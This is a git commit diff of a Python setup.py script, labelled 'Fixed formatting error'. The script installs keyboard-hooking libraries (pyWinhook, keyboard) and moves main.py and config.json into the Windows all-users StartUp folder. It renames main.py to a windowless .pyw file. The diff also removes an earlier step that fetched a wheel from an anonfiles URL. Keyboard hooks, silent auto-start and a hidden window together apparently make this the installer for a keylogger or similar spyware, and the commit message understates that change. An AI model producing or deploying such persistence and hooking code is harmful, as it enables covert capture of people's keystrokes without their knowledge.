5c5bcba700586c85cb659c8d3abb859df41b58c7
Someone's PC <footit4@gmail.com>
2021-05-20 15:08:38 -0700

    Fixed formatting error

--- setup.py
+++ setup.py
@@ -2,30 +2,22 @@ import os
 import subprocess
 import sys
 
-import requests
-
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 
 # download all needed libraries
-r = requests.get(
-    "https://cdn-115.anonfiles.com/Pdy9l9xaud/0a52e7e1-1621545780/pyWinhook-1.6.2-cp39-cp39-win_amd64.whl",
-    allow_redirects=True,
-)
-open("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl", "wb").write(r.content)
 install("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")
-os.remove("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")
-
 install("pythoncom")
 install("keyboard")
 
 # move main and config to startup folder
 os.rename(
-    "main.py", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\main.py"
+    "main.py",
+    "C:/ProgramData/Microsoft/" "Windows/Start Menu/Programs/StartUp/main.pyw",
 )
 os.rename(
     "config.json",
-    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\config.json",
+    "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/config.json",
 )
